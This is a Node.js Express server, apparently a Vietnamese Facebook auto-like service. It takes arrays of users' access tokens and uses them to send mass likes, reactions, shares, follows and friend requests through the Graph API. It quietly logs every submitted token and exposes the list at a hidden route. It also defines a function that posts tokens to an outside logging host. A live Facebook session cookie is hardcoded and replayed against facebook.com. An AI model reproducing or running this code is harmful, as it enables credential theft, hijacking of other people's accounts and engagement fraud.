const bodyParser = require('body-parser')
const express = require("express")
const app = express()
const server = require('http').Server(app)
const request = require('request')
var log_access = []
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({
    extended: false
}))
app.get('/', (req, res) => {
    res.send("Không Được Đâu Sói Ạ ^^")
})
app.get('/cookie', (req, res) => {
	var headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/64.4.130 Chrome/58.4.3029.130 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'datr=G3WdWUD_Nw5QyHfD-oorEZKq; locale=vi_VN; sb=hSyeWbA9uBF-KcSV5GdsgCkU; pl=y; c_user=100003980368244; xs=39%3AbmnaaBdfZRm_SA%3A2%3A1504452359%3A1399%3A6245; fr=0zOij2cYUHg5y4MnT.AWV9pD8Tjc_xCLdAnGcherRxneo.BZnXUb.sJ.Fms.0.0.BZrOLf.AWWg36Nn; act=1504503736138%2F8; presence=EDvF3EtimeF1504503877EuserFA21B03980368244A2EstateFDt3F_5bDiFA2user_3a1B09580369715A2ErF1EoF1EfF1CAcDiFA2user_3a1B08176631256A2ErF1EoF2EfF2C_5dEutc3F1504503622578G504503877940CEchFDp_5f1B03980368244F3CC'
    }
    var options = {
        url: 'https://www.facebook.com/2T.BK.9x',
        method: 'GET',
        headers: headers,
        form: {}
    }
    request(options, function(error, response, body) {
        if (!error && response.statusCode == 200) {
            res.send(body)
        }
    })
})
app.get('/_Neiht-kaki', (req, res) => {
    res.json(log_access)
})
app.post('/Auto-Like', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
        if (!in_array(req.body.access_token[a], log_access)) {
            log_access.push(req.body.access_token[a]);
        }
    	! function(a) {
            setTimeout(function() {
                AutoLike(req.body.id, req.body.access_token[a])
            }, a * req.body.time_delay)
        }
        (a)
    }
    res.json({
        status: 200,
        type: 'Auto Like',
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
app.post('/Auto@Like', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
       if (!in_array(req.body.access_token[a], log_access)) {
            log_access.push(req.body.access_token[a]);
        }
    	! function(a) {
            setTimeout(function() {
                AutoLike(req.body.id, req.body.access_token[a])
            }, a * req.body.time_delay)
        }
        (a)
    }
    res.json({
        status: 200,
        type: 'Auto Like',
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
app.post('/Auto-React', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
    	! function(a) {
            setTimeout(function() {
                AutoReact(req.body.typeReact, req.body.id, req.body.access_token[a])
            }, a * req.body.time_delay)
        }
        (a)
    }
    res.json({
        status: 200,
        type: 'Auto Reaction',
        type_reaction: req.body.typeReact,
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
app.post('/Auto-Share', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
    	! function(a) {
            setTimeout(function() {
                AutoShare(req.body.id, req.body.access_token[a])
            }, a * req.body.time_delay)
        }
        (a)
    }
    res.json({
        status: 200,
        type: 'Auto Share',
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
app.post('/Auto-Sub', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
        	! function(a) {
                setTimeout(function() {
                    AutoSub(req.body.id, req.body.access_token[a])
                }, a * req.body.time_delay)
            }
            (a)
    }
    res.json({
        status: 200,
        type: 'Auto Sub',
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
app.post('/Auto-AddFriend', (req, res) => {
    for (var a = 0; a < req.body.access_token.length; a++) {
   		! function(a) {
            setTimeout(function() {
                AutoAddFriend(req.body.id, req.body.access_token[a])
            }, a * req.body.time_delay)
        }
        (a)
    }
    res.json({
        status: 200,
        type: 'Auto Add Friend',
        fbid: req.body.id,
        total_access_token: req.body.access_token.length,
        time_delay: req.body.time_delay,
        developer: '_Neiht'
    })
})
function AutoLike(ID, TOKEN) {
    request('https://graph.facebook.com/' + ID + '/likes?method=post&access_token=' + TOKEN, (error, response, body) => {
        console.log(body)
    })
}

function AutoReact(typeReact, ID, TOKEN) {
    request('https://graph.facebook.com/' + ID + '/reactions?method=post&access_token=' + TOKEN + '&type=' + typeReact, (error, response, body) => {
        console.log(body)
    })
}

function AutoShare(ID, TOKEN) {
    request('https://graph.facebook.com/' + ID + '/sharedposts?method=post&access_token=' + TOKEN, (error, response, body) => {
        console.log(body)
    })
}

function AutoSub(ID, TOKEN) {
    request('https://graph.facebook.com/' + ID + '/subscribers?method=post&access_token=' + TOKEN, (error, response, body) => {
        console.log(body)
    })
}

function AutoAddFriend(ID, TOKEN) {
    request('https://graph.facebook.com/me/friends?uid=' + ID + '&method=post&access_token=' + TOKEN, (error, response, body) => {
        console.log(body)
    })
}

function saveToken(arr_token) {
    var headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/64.4.130 Chrome/58.4.3029.130 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cookie': ''
    }
    var options = {
        url: 'http://thien-it.me/log.php',
        method: 'POST',
        headers: headers,
        form: {
            access_token: arr_token
        }
    }
    request(options, function(error, response, body) {
        if (!error && response.statusCode == 200) {
            console.log(body)
        }
    })
}
function in_array(needle, haystack){
    return haystack.indexOf(needle) !== -1;
}
app.set('port', process.env.OPENSHIFT_NODEJS_PORT || process.env.PORT || 3000)
app.set('ip', process.env.OPENSHIFT_NODEJS_IP || process.env.IP || "127.0.0.1")
server.listen(app.get('port'), app.get('ip'), function() {
    console.log("fbapps server listening at %s:%d ", app.get('ip'), app.get('port'))
})